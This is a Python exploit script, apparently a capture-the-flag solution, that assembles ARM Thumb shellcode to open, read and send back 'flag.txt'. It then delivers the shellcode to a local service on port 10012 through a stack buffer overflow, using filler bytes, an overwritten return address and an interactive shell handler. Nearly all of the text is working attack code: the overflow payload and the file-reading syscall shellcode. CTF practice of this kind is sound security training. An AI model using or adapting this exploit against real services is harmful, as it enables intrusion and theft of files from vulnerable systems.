asm = '''.section .text
.global _start

.ascii "%s"
_start:
    eor r4, r4, r4
    b get_addr
ret:
    mov r3, lr
    sub r3, #1
open:
    mov	r0, r3
    mov r1, r4
    mov	r2, r4
    bl open2
read:
    mov	r1, r7
    mov	r2, #0x7f
    bl read2
write:
    mov r0, r8
    mov r1, r7
    mov r2, #0x7f
    bl write2
exit:
    bl exit2
open2:
    bx	pc
    mov r8, r8
    .word 0xef000066
    .word 0xe12fff1e
read2:
    bx	pc
    mov r8, r8
    .word 0xef00006a
    .word 0xe12fff1e
write2:
    bx	pc
    mov r8, r8
    .word 0xef000069
    .word 0xe12fff1e
exit2:
    bx pc
    mov r8, r8
    .word 0xef000011
    .word 0xe12fff1e
get_addr:
    bl ret
.ascii "%s"
  '''

import os
from lib.mylib import *

ARCH = 'arm'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -mthumb -mthumb-interwork -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10012
s = mysock(IP, PORT)
sl(s, '\n000')
SP = 0x1b0c + 1
shellcode = 'AAAAAAAAAAAAAAAAAAAA' + p(SP) + shellcode + '\n'
sl(s, shellcode)
shell(s)
